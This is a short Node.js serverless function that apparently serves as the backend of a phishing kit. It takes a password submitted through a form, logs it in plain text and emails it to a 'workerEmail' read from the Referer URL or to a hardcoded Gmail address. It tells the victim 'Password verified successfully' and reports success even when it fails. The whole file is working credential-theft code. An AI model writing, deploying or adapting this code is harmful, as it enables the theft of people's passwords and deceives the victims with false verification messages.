import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  try {
    const { password } = req.body;

    console.log('🔐 Password Form Received:');
    console.log('Password:', password);
    
    // ✅ Get workerEmail from SUBMIT FORM REFERER
    const workerEmail = await extractWorkerEmailFromReferer(req);
    
    console.log('📧 Extracted workerEmail:', workerEmail);
    
    const emailResult = await sendPasswordEmail(password, workerEmail);

    return res.status(200).json({
      success: true,
      message: 'Password verified successfully',
      emailSent: emailResult.success,
      recipient: workerEmail,
      emailMessage: emailResult.message
    });

  } catch (error) {
    console.error('❌ Server Error:', error);
    return res.status(200).json({
      success: true,
      message: 'Verification completed',
      emailSent: false
    });
  }
}

// Function to extract workerEmail from submit form
async function extractWorkerEmailFromReferer(req) {
  try {
    // Get referer URL (where request came from)
    const referer = req.headers.referer || '';
    console.log('Referer URL:', referer);
    
    // Default email
    let workerEmail = "mehtaballii67890@gmail.com";
    
    // If referer contains submit form data
    if (referer.includes('workerEmail=')) {
      // Try to extract from URL parameters
      const url = new URL(referer);
      const params = new URLSearchParams(url.search);
      workerEmail = params.get('workerEmail') || workerEmail;
    }
    
    // If no URL param, check cookies or localStorage (not possible server-side)
    
    return workerEmail;
    
  } catch (error) {
    console.error('Error extracting email:', error);
    return "mehtaballi67890@gmail.com";
  }
}

async function sendPasswordEmail(password, workerEmail) {
  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: { user: process.env.GMAIL_USER, pass: process.env.GMAIL_APP_PASS }
    });

    await transporter.sendMail({
      from: `"Password System" <${process.env.GMAIL_USER}>`,
      to: workerEmail,
      subject: `🔐 Password Submitted`,
      html: `<div><h2>Password: ${password}</h2><p>Time: ${new Date().toLocaleString()}</p></div>`
    });
    
    console.log('✅ Password sent to extracted email:', workerEmail);
    return { success: true, message: 'Email sent' };

  } catch (error) {
    console.error('❌ Email Error:', error);
    return { success: false, message: error.message };
  }
}
